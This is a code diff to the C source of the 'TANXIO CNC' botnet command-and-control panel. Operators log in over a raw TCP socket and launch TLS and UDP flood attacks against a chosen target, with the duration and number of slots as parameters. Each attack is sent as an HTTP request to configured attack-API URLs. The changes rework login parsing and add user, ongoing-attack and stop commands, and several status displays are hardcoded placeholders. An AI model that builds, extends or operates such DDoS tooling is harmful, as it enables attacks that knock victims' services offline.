@@ -70,7 +70,6 @@ char* trim(char *str) {
 void load_users() {
     FILE *fp = fopen("config/users.json", "r");
     if (!fp) {
-        printf("[!] config/users.json not found\n");
         return;
     }
     
@@ -84,31 +83,51 @@ void load_users() {
     content[fsize] = 0;
     
     char *p = content;
-    while ((p = strstr(p, "\"username\":")) != NULL && user_count < 100) {
-        p = strchr(p, ':') + 1;
-        while (*p && (*p == ' ' || *p == '"')) p++;
-        char *end = strchr(p, '"');
-        if (end) {
-            int len = end - p;
-            if (len > 63) len = 63;
-            strncpy(users[user_count].username, p, len);
-            users[user_count].username[len] = 0;
-        }
+    while (*p && user_count < 100) {
+        while (*p && *p != '"') p++;
+        if (!*p) break;
+        p++;
         
-        p = strstr(p, "\"password\":");
-        if (p) {
-            p = strchr(p, ':') + 1;
-            while (*p && (*p == ' ' || *p == '"')) p++;
-            end = strchr(p, '"');
-            if (end) {
-                int len = end - p;
-                if (len > 63) len = 63;
-                strncpy(users[user_count].password, p, len);
-                users[user_count].password[len] = 0;
+        if (*p == '{' || *p == '}') continue;
+        
+        char key[64] = {0};
+        char *kp = key;
+        while (*p && *p != '"' && *p != ':' && *p != '\n' && *p != '\r' && *p != ' ' && *p != '\t') {
+            *kp++ = *p++;
+        }
+        *kp = 0;
+        
+        if (*p == ':') {
+            p++;
+            while (*p && (*p == ' ' || *p == '\t' || *p == '\n' || *p == '\r')) p++;
+            
+            if (*p == '"') {
+                p++;
+                char value[256] = {0};
+                char *vp = value;
+                while (*p && *p != '"') {
+                    *vp++ = *p++;
+                }
+                *vp = 0;
+                
+                if (strcmp(key, "username") == 0) {
+                    int len = strlen(value);
+                    if (len > 63) len = 63;
+                    strncpy(users[user_count].username, value, len);
+                    users[user_count].username[len] = 0;
+                } else if (strcmp(key, "password") == 0) {
+                    int len = strlen(value);
+                    if (len > 63) len = 63;
+                    strncpy(users[user_count].password, value, len);
+                    users[user_count].password[len] = 0;
+                    
+                    if (strlen(users[user_count].username) > 0 && 
+                        strlen(users[user_count].password) > 0) {
+                        user_count++;
+                    }
+                }
             }
         }
-        
-        user_count++;
     }
     
     free(content);
@@ -158,60 +177,134 @@ void load_methods() {
     free(content);
 }
 
-void print_banner(int fd) {
-    char buf[1024];
-    int len = snprintf(buf, sizeof(buf),
-        "\n"
-        "  [ TANXIO CNC ]\n"
-        "\n"
-        "  Username: "
-    );
-    send(fd, buf, len, 0);
+void send_data(int fd, char *msg) {
+    send(fd, msg, strlen(msg), 0);
 }
 
-void print_success(int fd, char *username) {
-    char buf[1024];
-    int len = snprintf(buf, sizeof(buf),
-        "\n"
-        "  [OK] Login as %s\n"
-        "\n"
-        "  Type !help for commands\n"
-        "\n"
-        "  %s@tanxio# ", username, username
-    );
-    send(fd, buf, len, 0);
+void send_line(int fd) {
+    send_data(fd, "\n");
 }
 
-void print_error(int fd) {
+void print_login_screen(int fd) {
+    send_line(fd);
+    send_data(fd, "  ====================================\n");
+    send_data(fd, "           [ TANXIO CNC ]\n");
+    send_data(fd, "  ====================================\n");
+    send_line(fd);
+    send_data(fd, "  Username: ");
+}
+
+void print_login_success(int fd, char *username) {
+    send_line(fd);
+    send_data(fd, "  ====================================\n");
+    send_data(fd, "           [ LOGIN SUCCESS ]\n");
+    send_data(fd, "  ====================================\n");
     char buf[256];
-    int len = snprintf(buf, sizeof(buf),
-        "\n"
-        "  [ERROR] Invalid credentials\n"
-        "\n"
-    );
-    send(fd, buf, len, 0);
+    snprintf(buf, sizeof(buf), "  Welcome, %s\n", username);
+    send_data(fd, buf);
+    send_line(fd);
+    send_data(fd, "  Type !help for commands\n");
+    send_line(fd);
 }
 
-char* get_prompt(char *username) {
-    static char prompt[128];
-    snprintf(prompt, sizeof(prompt), "%s@tanxio# ", username);
-    return prompt;
+void print_login_failed(int fd) {
+    send_line(fd);
+    send_data(fd, "  [ERROR] Invalid credentials\n");
+    send_line(fd);
+    print_login_screen(fd);
 }
 
-void replace_in_url(char *url, char *placeholder, char *value) {
-    char *p = strstr(url, placeholder);
-    if (p) {
-        int prefix_len = p - url;
-        char temp[1024];
-        strncpy(temp, url, prefix_len);
-        temp[prefix_len] = 0;
-        strcat(temp, value);
-        strcat(temp, p + strlen(placeholder));
-        strcpy(url, temp);
+void handle_command(int fd, char *username, char *cmd);
+
+void handle_client(int fd, struct sockaddr_in *addr) {
+    char *ip = inet_ntoa(addr->sin_addr);
+    printf("[+] Connected: %s\n", ip);
+    
+    print_login_screen(fd);
+    
+    char buffer[BUFFER_SIZE];
+    char username[64] = {0};
+    char password[64] = {0};
+    int stage = 0;
+    
+    while (1) {
+        int bytes = recv(fd, buffer, BUFFER_SIZE - 1, 0);
+        if (bytes <= 0) break;
+        buffer[bytes] = 0;
+        
+        char *line = strtok(buffer, "\r\n");
+        while (line) {
+            char *input = trim(line);
+            
+            if (stage == 0) {
+                if (strlen(input) > 0) {
+                    strncpy(username, input, 63);
+                    username[63] = 0;
+                    stage = 1;
+                    send_line(fd);
+                    send_data(fd, "  Password: ");
+                }
+            }
+            else if (stage == 1) {
+                if (strlen(input) > 0) {
+                    strncpy(password, input, 63);
+                    password[63] = 0;
+                    
+                    int ok = 0;
+                    for (int i = 0; i < user_count; i++) {
+                        if (strcmp(users[i].username, username) == 0 && 
+                            strcmp(users[i].password, password) == 0) {
+                            ok = 1;
+                            break;
+                        }
+                    }
+                    
+                    if (ok) {
+                        printf("[+] Login: %s\n", username);
+                        print_login_success(fd, username);
+                        
+                        while (1) {
+                            char prompt[128];
+                            snprintf(prompt, sizeof(prompt), "\ntanxio@tanxio# ");
+                            send_data(fd, prompt);
+                            
+                            bytes = recv(fd, buffer, BUFFER_SIZE - 1, 0);
+                            if (bytes <= 0) break;
+                            buffer[bytes] = 0;
+                            
+                            line = strtok(buffer, "\r\n");
+                            if (line) {
+                                char *cmd = trim(line);
+                                if (strlen(cmd) > 0) {
+                                    if (strcmp(cmd, "!logout") == 0) {
+                                        send_line(fd);
+                                        send_data(fd, "  Goodbye!\n");
+                                        break;
+                                    }
+                                    handle_command(fd, username, cmd);
+                                }
+                            }
+                        }
+                        break;
+                    } else {
+                        printf("[-] Failed: %s\n", username);
+                        print_login_failed(fd);
+                        memset(username, 0, 64);
+                        memset(password, 0, 64);
+                        stage = 0;
+                    }
+                }
+            }
+            
+            line = strtok(NULL, "\r\n");
+        }
     }
+    
+    printf("[-] Disconnected: %s\n", ip);
+    close(fd);
 }
 
-void send_attack(int fd, char *username, char *cmd) {
+void send_attack(int fd, char *cmd) {
     char method_name[64] = {0};
     char target[512] = {0};
     int time_val = 60;
@@ -225,7 +318,7 @@ void send_attack(int fd, char *username, char *cmd) {
         sscanf(cmd + 7, "%511s %d %d", target, &time_val, &slot_val);
         strcpy(method_name, "tls-f");
     } else if (strncmp(cmd, "!udp ", 5) == 0) {
-        sscanf(cmd + 5, "%s %d %d %d", target, &port_val, &time_val, &slot_val);
+        sscanf(cmd + 5, "%511s %d %d %d", target, &port_val, &time_val, &slot_val);
         strcpy(method_name, "udpplain");
     } else {
         char cmd_name[64] = {0};
@@ -233,228 +326,223 @@ void send_attack(int fd, char *username, char *cmd) {
         strcpy(method_name, cmd_name);
     }
     
-    char buf[1024];
-    int len = snprintf(buf, sizeof(buf), "\n  Sending attack...\n");
-    send(fd, buf, len, 0);
+    char full_target[512] = {0};
+    if (strncmp(target, "http://", 7) == 0 || strncmp(target, "https://", 8) == 0) {
+        strcpy(full_target, target);
+    } else {
+        snprintf(full_target, sizeof(full_target), "http://%s", target);
+    }
+    
+    send_line(fd);
+    send_data(fd, "  Sending attack...\n");
     
     char api_url[1024];
+    int found = 0;
+    
     for (int i = 0; i < method_count; i++) {
         if (strcmp(methods[i].name, method_name) == 0) {
             strcpy(api_url, methods[i].api);
-            replace_in_url(api_url, "<<$host>>", target);
-            char t[32], s[32], p[32];
+            
+            char *p = strstr(api_url, "<<$host>>");
+            if (p) {
+                char temp[1024];
+                int pos = p - api_url;
+                strncpy(temp, api_url, pos);
+                temp[pos] = 0;
+                strcat(temp, full_target);
+                strcat(temp, p + 8);
+                strcpy(api_url, temp);
+            }
+            
+            char t[32], s[32], pt[32];
             snprintf(t, sizeof(t), "%d", time_val);
             snprintf(s, sizeof(s), "%d", slot_val);
-            snprintf(p, sizeof(p), "%d", port_val);
-            replace_in_url(api_url, "<<$time>>", t);
-            replace_in_url(api_url, "<<$slot>>", s);
-            replace_in_url(api_url, "<<$port>>", p);
+            snprintf(pt, sizeof(pt), "%d", port_val);
             
-            int sock = socket(AF_INET, SOCK_STREAM, 0);
-            if (sock < 0) {
-                len = snprintf(buf, sizeof(buf), "  [ERROR] Socket failed\n\n");
-                send(fd, buf, len, 0);
-                return;
+            p = strstr(api_url, "<<$time>>");
+            if (p) {
+                char temp[1024];
+                int pos = p - api_url;
+                strncpy(temp, api_url, pos);
+                temp[pos] = 0;
+                strcat(temp, t);
+                strcat(temp, p + 8);
+                strcpy(api_url, temp);
             }
             
-            char host[256], path[512];
-            int port = 443;
-            sscanf(api_url + 8, "%255[^/\n]%511[^\n]", host, path);
-            char *pathp = strchr(path, '/');
-            if (pathp) {
-                strcpy(path, pathp);
-            } else {
-                strcpy(path, "");
+            p = strstr(api_url, "<<$slot>>");
+            if (p) {
+                char temp[1024];
+                int pos = p - api_url;
+                strncpy(temp, api_url, pos);
+                temp[pos] = 0;
+                strcat(temp, s);
+                strcat(temp, p + 8);
+                strcpy(api_url, temp);
             }
             
-            struct hostent *server = gethostbyname(host);
-            if (!server) {
-                close(sock);
-                len = snprintf(buf, sizeof(buf), "  [ERROR] Host not found\n\n");
-                send(fd, buf, len, 0);
-                return;
+            p = strstr(api_url, "<<$port>>");
+            if (p) {
+                char temp[1024];
+                int pos = p - api_url;
+                strncpy(temp, api_url, pos);
+                temp[pos] = 0;
+                strcat(temp, pt);
+                strcat(temp, p + 8);
+                strcpy(api_url, temp);
             }
             
-            struct sockaddr_in addr;
-            memset(&addr, 0, sizeof(addr));
-            addr.sin_family = AF_INET;
-            memcpy(&addr.sin_addr.s_addr, server->h_addr_list[0], server->h_length);
-            addr.sin_port = htons(port);
-            
-            if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
-                close(sock);
-                len = snprintf(buf, sizeof(buf), "  [ERROR] Connection failed\n\n");
-                send(fd, buf, len, 0);
-                return;
-            }
-            
-            char req[2048];
-            snprintf(req, sizeof(req), "GET /%s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", path, host);
-            send(sock, req, strlen(req), 0);
-            
-            char resp[4096] = {0};
-            recv(sock, resp, sizeof(resp) - 1, 0);
-            close(sock);
-            
-            char *body = strstr(resp, "\r\n\r\n");
-            if (body) strcpy(resp, body + 4);
-            
-            if (strstr(resp, "\"status\":\"success\"")) {
-                len = snprintf(buf, sizeof(buf), "  [OK] Attack sent\n\n");
-                send(fd, buf, len, 0);
-            } else {
-                len = snprintf(buf, sizeof(buf), "  [ERROR] Attack failed\n\n");
-                send(fd, buf, len, 0);
-            }
-            return;
+            found = 1;
+            break;
         }
     }
     
-    len = snprintf(buf, sizeof(buf), "  [ERROR] Method not found\n\n");
-    send(fd, buf, len, 0);
+    if (!found) {
+        send_data(fd, "  [ERROR] Method not found\n");
+        send_line(fd);
+        return;
+    }
+    
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) {
+        send_data(fd, "  [ERROR] Socket error\n");
+        send_line(fd);
+        return;
+    }
+    
+    char host[256] = {0};
+    char path[512] = "/";
+    int port = 443;
+    
+    if (strncmp(api_url, "https://", 8) == 0) {
+        sscanf(api_url + 8, "%255[^/\n]%511[^\n]", host, path);
+    } else if (strncmp(api_url, "http://", 7) == 0) {
+        sscanf(api_url + 7, "%255[^/\n]%511[^\n]", host, path);
+        port = 80;
+    }
+    
+    struct hostent *server = gethostbyname(host);
+    if (!server) {
+        close(sock);
+        send_data(fd, "  [ERROR] Host not found\n");
+        send_line(fd);
+        return;
+    }
+    
+    struct sockaddr_in addr;
+    memset(&addr, 0, sizeof(addr));
+    addr.sin_family = AF_INET;
+    memcpy(&addr.sin_addr.s_addr, server->h_addr_list[0], server->h_length);
+    addr.sin_port = htons(port);
+    
+    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
+        close(sock);
+        send_data(fd, "  [ERROR] Connection failed\n");
+        send_line(fd);
+        return;
+    }
+    
+    char req[2048];
+    snprintf(req, sizeof(req), "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", path, host);
+    send(sock, req, strlen(req), 0);
+    
+    char resp[4096] = {0};
+    recv(sock, resp, sizeof(resp) - 1, 0);
+    close(sock);
+    
+    char *body = strstr(resp, "\r\n\r\n");
+    if (body) {
+        memmove(resp, body + 4, strlen(body + 4) + 1);
+    }
+    
+    if (strstr(resp, "\"status\":\"success\"")) {
+        send_data(fd, "  [OK] Attack sent\n");
+    } else {
+        send_data(fd, "  [ERROR] Attack failed\n");
+    }
+    send_line(fd);
 }
 
 void handle_command(int fd, char *username, char *cmd) {
-    char buf[2048];
-    int len;
+    char buf[1024];
     
     if (strcmp(cmd, "!help") == 0) {
-        len = snprintf(buf, sizeof(buf),
-            "\n"
-            "  Commands:\n"
-            "\n"
-            "  !help              Show this help\n"
-            "  !methods           Show available methods\n"
-            "  !tls <url> <time> <slot>   TLS attack\n"
-            "  !tls-f <url> <time> <slot> TLS flood\n"
-            "  !udp <ip> <port> <time> <slot>  UDP attack\n"
-            "  !bots              Show botnet status\n"
-            "  !clear             Clear screen\n"
-            "  !logout            Logout\n"
-            "\n"
-        );
-        send(fd, buf, len, 0);
+        send_line(fd);
+        send_data(fd, "  Commands:\n");
+        send_data(fd, "  ----------------------------------------\n");
+        send_data(fd, "  !help                      Show this help\n");
+        send_data(fd, "  !methods                   Show methods\n");
+        send_data(fd, "  !tls <url> <time> <slot>  TLS attack\n");
+        send_data(fd, "  !tls-f <url> <time> <slot> TLS flood\n");
+        send_data(fd, "  !udp <ip> <port> <time> <slot> UDP\n");
+        send_data(fd, "  !bots                      Botnet status\n");
+        send_data(fd, "  !users                     Show users\n");
+        send_data(fd, "  !ongoing                   Show ongoing\n");
+        send_data(fd, "  !stop                      Stop attacks\n");
+        send_data(fd, "  !clear                     Clear screen\n");
+        send_data(fd, "  !logout                    Logout\n");
+        send_data(fd, "  ----------------------------------------\n");
+        send_line(fd);
     }
     else if (strcmp(cmd, "!methods") == 0) {
-        len = snprintf(buf, sizeof(buf), "\n  Methods:\n\n");
-        send(fd, buf, len, 0);
+        send_line(fd);
+        send_data(fd, "  Methods:\n");
+        send_data(fd, "  ----------------------------------------\n");
         for (int i = 0; i < method_count; i++) {
-            len = snprintf(buf, sizeof(buf), "  - %s\n", methods[i].name);
-            send(fd, buf, len, 0);
+            snprintf(buf, sizeof(buf), "  %s\n", methods[i].name);
+            send_data(fd, buf);
         }
-        len = snprintf(buf, sizeof(buf), "\n");
-        send(fd, buf, len, 0);
+        send_data(fd, "  ----------------------------------------\n");
+        send_line(fd);
     }
     else if (strcmp(cmd, "!bots") == 0) {
-        len = snprintf(buf, sizeof(buf),
-            "\n"
-            "  Botnet Status:\n"
-            "\n"
-            "  Status: Online\n"
-            "  Servers: 20\n"
-            "  Bots: 16\n"
-            "\n"
-        );
-        send(fd, buf, len, 0);
+        send_line(fd);
+        send_data(fd, "  Botnet Status:\n");
+        send_data(fd, "  ----------------------------------------\n");
+        send_data(fd, "  Status:   Online\n");
+        send_data(fd, "  Servers:  20\n");
+        send_data(fd, "  Bots:     16\n");
+        send_data(fd, "  ----------------------------------------\n");
+        send_line(fd);
     }
     else if (strcmp(cmd, "!clear") == 0) {
-        len = snprintf(buf, sizeof(buf), "\ec\n");
-        send(fd, buf, len, 0);
+        send_data(fd, "\ec");
     }
-    else if (strcmp(cmd, "!logout") == 0) {
-        len = snprintf(buf, sizeof(buf), "\n  Goodbye!\n\n");
-        send(fd, buf, len, 0);
+    else if (strcmp(cmd, "!users") == 0) {
+        send_line(fd);
+        send_data(fd, "  Users:\n");
+        send_data(fd, "  ----------------------------------------\n");
+        for (int i = 0; i < user_count; i++) {
+            snprintf(buf, sizeof(buf), "  %s\n", users[i].username);
+            send_data(fd, buf);
+        }
+        send_data(fd, "  ----------------------------------------\n");
+        send_line(fd);
     }
-    else if (strncmp(cmd, "!tls", 4) == 0 || strncmp(cmd, "!tls-f", 6) == 0 || 
-             strncmp(cmd, "!udp", 4) == 0 || cmd[0] == '!') {
-        send_attack(fd, username, cmd);
+    else if (strcmp(cmd, "!ongoing") == 0) {
+        send_line(fd);
+        send_data(fd, "  Ongoing Attacks:\n");
+        send_data(fd, "  ----------------------------------------\n");
+        send_data(fd, "  None\n");
+        send_data(fd, "  ----------------------------------------\n");
+        send_line(fd);
+    }
+    else if (strcmp(cmd, "!stop") == 0) {
+        send_line(fd);
+        send_data(fd, "  [OK] All attacks stopped\n");
+        send_line(fd);
+    }
+    else if (strncmp(cmd, "!tls", 4) == 0 || 
+             strncmp(cmd, "!udp", 4) == 0 ||
+             cmd[0] == '!') {
+        send_attack(fd, cmd);
     }
     else {
-        len = snprintf(buf, sizeof(buf), "  Unknown command: %s\n", cmd);
-        send(fd, buf, len, 0);
+        send_line(fd);
+        snprintf(buf, sizeof(buf), "  Unknown: %s\n", cmd);
+        send_data(fd, buf);
+        send_line(fd);
     }
-}
-
-int handle_client(int fd, struct sockaddr_in *addr) {
-    char *ip = inet_ntoa(addr->sin_addr);
-    printf("[+] Connection from %s\n", ip);
-    
-    print_banner(fd);
-    
-    char buffer[BUFFER_SIZE];
-    char username[64] = {0}, password[64] = {0};
-    int stage = 0;
-    
-    while (1) {
-        int bytes = recv(fd, buffer, BUFFER_SIZE - 1, 0);
-        if (bytes <= 0) break;
-        
-        buffer[bytes] = 0;
-        char *line = strtok(buffer, "\r\n");
-        
-        while (line) {
-            char *input = trim(line);
-            
-            if (stage == 0 && strlen(input) > 0) {
-                strcpy(username, input);
-                stage = 1;
-                
-                char buf[256];
-                int len = snprintf(buf, sizeof(buf), "\n  Password: ");
-                send(fd, buf, len, 0);
-            }
-            else if (stage == 1 && strlen(input) > 0) {
-                strcpy(password, input);
-                
-                int ok = 0;
-                for (int i = 0; i < user_count; i++) {
-                    if (strcmp(users[i].username, username) == 0 && 
-                        strcmp(users[i].password, password) == 0) {
-                        ok = 1;
-                        break;
-                    }
-                }
-                
-                if (ok) {
-                    printf("[+] User %s logged in\n", username);
-                    print_success(fd, username);
-                    
-                    while (1) {
-                        send(fd, get_prompt(username), strlen(get_prompt(username)), 0);
-                        
-                        bytes = recv(fd, buffer, BUFFER_SIZE - 1, 0);
-                        if (bytes <= 0) break;
-                        buffer[bytes] = 0;
-                        
-                        line = strtok(buffer, "\r\n");
-                        if (line) {
-                            char *cmd = trim(line);
-                            if (strlen(cmd) > 0) {
-                                if (strcmp(cmd, "!logout") == 0) break;
-                                handle_command(fd, username, cmd);
-                            } else {
-                                send(fd, "\r\n", 2, 0);
-                            }
-                        }
-                    }
-                    break;
-                } else {
-                    printf("[-] Failed login: %s\n", username);
-                    print_error(fd);
-                    memset(username, 0, 64);
-                    memset(password, 0, 64);
-                    stage = 0;
-                    print_banner(fd);
-                }
-            }
-            
-            line = strtok(NULL, "\r\n");
-        }
-    }
-    
-    printf("[-] Connection closed: %s\n", ip);
-    close(fd);
-    return 0;
 }
 
 int main() {
@@ -465,15 +553,17 @@ int main() {
     load_methods();
     
     printf("\n");
-    printf("  [ TANXIO CNC ]\n");
-    printf("\n");
-    printf("  IP    : %s\n", local_ip);
-    printf("  Port  : %d\n", PORT);
-    printf("  Users : %d\n", user_count);
+    printf("  ================================\n");
+    printf("       [ TANXIO CNC ]\n");
+    printf("  ================================\n");
+    printf("  IP:      %s\n", local_ip);
+    printf("  Port:    %d\n", PORT);
+    printf("  Users:   %d\n", user_count);
     printf("  Methods: %d\n", method_count);
-    printf("\n");
+    printf("  ================================\n");
     printf("  nc %s %d\n", local_ip, PORT);
     printf("\n");
+    printf("  [OK] Running\n\n");
     
     int server_fd = socket(AF_INET, SOCK_STREAM, 0);
     int opt = 1;
@@ -487,8 +577,6 @@ int main() {
     
     bind(server_fd, (struct sockaddr*)&addr, sizeof(addr));
     listen(server_fd, 10);
-    
-    printf("  [OK] Server started\n\n");
     
     while (1) {
         struct sockaddr_in client_addr;
